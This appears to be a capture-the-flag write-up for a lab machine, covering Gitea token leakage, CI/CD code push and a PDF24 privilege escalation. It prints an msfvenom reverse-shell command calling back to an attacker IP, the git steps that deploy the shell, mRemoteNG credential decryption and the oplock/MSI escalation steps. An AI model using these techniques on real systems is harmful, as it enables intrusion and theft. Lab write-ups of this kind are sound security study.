Retro is an **easy** difficulty machine where enumeration revealed a static website on port 80 and a Gitea instance on port 3000. Exploring Gitea, a repository by ellen.freeman contained a script with an exposed access token, leading to the cloning of a hidden "website" repository with CI/CD integration. A reverse shell was injected and executed, gaining access as ellen.freeman. In her Documents, a config file for mRemoteNG with encrypted credentials was found and decrypted, allowing access to Gale's account. A local privilege escalation vulnerability in PDF24 was exploited, ultimately obtaining a SYSTEM-level shell and the root flag.

# Enumeration

```
PORT     STATE SERVICE
80/tcp   open  http
445/tcp  open  microsoft-ds
3000/tcp open  ppp
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
```

I started by looking at port 80 with some directory brute-forcing by nothing interesting. It seems like it's a static website.

Next, I visited port 3000 and It was running Gitea.

I explored the Gitea instance and found **dev-scripts** repo by **ellen.freeman** and it looks like it's a script for accessing Gitea with the access token.

After that, I checked the previous commits and found an exposed access token of **ellen.freeman**.

# Shell as Ellen Freeman

I downloaded the script and after running it, it showed another hidden repository called **website**.

After researching for a bit I found out that I can clone a repository using an access token.

`git clone http://ellen.freeman:<REDACTED>@lock.vl:3000/ellen.freeman/website.git`

![](https://photos.squarezero.dev/file/abir-images/Lock/6.png)

Inside the repository, there was a README.md where it stated that the git repo would be automatically deployed after. And after looking at the repo carefully it seems like its the website hosted on port 80.

```
# New Project Website

CI/CD integration is now active - changes to the repository will automatically be deployed to the webserver
```

I created a reverse shell and used git to push the shell into the main website.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.2.110 LPORT=4444 -f aspx -o shell.aspx`

```bash
#Add username and email
git config --global user.name ellen.freeman
git config --global user.email ellen.freeman@lock.vl

#Stage the shell
git add shell.aspx 

#Commit with a message
git commit -m 'shell'

#Update the repo
git push
```

I made a request with curl and got a reverse shell.

`curl http://lock.vl/shell.aspx`

# Ellen.freeman to Gale.dekarios

Inside Ellen's Document folder, there was a config file.

```
C:\USERS\ELLEN.FREEMAN        
|   .git-credentials
|   .gitconfig
|   
+---.ssh      
|       authorized_keys       
|   
+---3D Objects
+---Contacts  
+---Desktop   
+---Documents 
|       config.xml  
|   
+---Downloads 
+---Favorites

+---Saved Games

```

The config file is for ***mRemoteNG*** which contains an encrypted password for the user.

I used ***mremoteng-decryptor*** to decrypt the config file and found credential for remote access. And after logging in I got the user flag.

# Gale.dekarios to root

On the desktop, I saw PDF24 and after looking online I found a local Privilege escalation for it.

[Local Privilege Escalation via MSI installer in PDF24](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)

After looking in the hidden folders I found ***_install folder*** which contains the installer for PDF24.

Next, I opened 2 terminals and in one of them I set the oplock on the PDF24 log file and after that in another terminal, I executed the installer with MSI just like it's said in the article.

`msiexec.exe /fa pdf24-creator-11.15.1-x64.msi`

`.\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r`

After waiting for a little bit a new CMD window opened and I followed alone the article to spawn a cmd shell as an administrator within the legacy console mode.

* Right-click on the top bar of the cmd window.
* click on properties.
* under options click on the “legacy console mode” link.
* open the link with a browser other than Internet Explorer or Edge (both don't open as SYSTEM when on Win11).
* in the opened browser window press the key combination CTRL+o.
* type “cmd.exe” in the top bar and press Enter.

Now with the administrator shell, I got the root flag.
